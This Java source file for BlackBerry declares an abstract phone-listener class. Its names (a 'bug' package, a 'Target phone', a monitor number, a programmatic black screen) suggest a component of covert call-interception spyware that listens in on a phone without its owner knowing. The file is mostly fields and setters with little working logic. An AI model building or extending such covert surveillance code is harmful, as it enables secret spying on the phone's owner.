package com.vvt.bug;

import net.rim.blackberry.api.phone.AbstractPhoneListener;
import net.rim.device.api.i18n.Locale;
import net.rim.device.api.ui.MenuItem;
import net.rim.device.api.ui.UiApplication;

public abstract class SCCL extends AbstractPhoneListener {
	
	//protected String monitorPhoneNumber;
	protected int sCCId;
	protected Util util = new Util();
	protected final String drop = "Drop Call";
	protected final String split = "Split Call";
	protected final String hold = "Hold";
	protected final String swap = "Swap";
	protected final String join = "Join";
	protected final String resume = "Resume";
	protected final String home = "Home";
	protected final String end = "End Call";
	protected UiApplication voiceApp;
	protected MenuItem endMenuItem;
	protected MenuItem joinMenuItem;
	protected MenuItem resumeMenuItem;
	protected MenuItem dropMenuItem;
	protected MenuItem homeMenuItem;
	protected MenuItem splitMenuItem;
	protected PhoneEventListenerSettings pelSettings;
	protected boolean localeEnglish;
	protected Locale locale;
	protected boolean normalCallActive; // true from the moment this listener is activated (initialize method called)
	protected boolean sCCActive; // true from the moment an scc is waiting
	protected int numberOfCallsActive; // This value doesn't include itself, Target phone.
	protected BugListener observer = null;
	//protected Vector sCCNumberStore = null;
	protected BugInfo bugInfo = null;
	
	public SCCL(PhoneEventListenerSettings pelSettings) {
		try {
			this.pelSettings = pelSettings;
			voiceApp = UiApplication.getUiApplication();
			locale = Locale.getDefault();
			localeEnglish = locale.getCode() == Locale.LOCALE_en || locale.getCode() == Locale.LOCALE_en_GB || locale.getCode() == Locale.LOCALE_en_US;
		} catch (Exception e) {
		}
	}

	public void setBugListener(BugListener observer) {
		this.observer = observer;
	}
	
	public void initialize() {
		pelSettings.setPel(this);
	}

	/*public void setSCCNumber(String msisdnStripped) {
		monitorPhoneNumber = msisdnStripped;
	}*/

	public void setBugInfo(BugInfo bugInfo) {
		this.bugInfo = bugInfo;
	}
	
	public abstract void considerUserInteractionEvent( boolean popBlackScreenProgrammatically);
}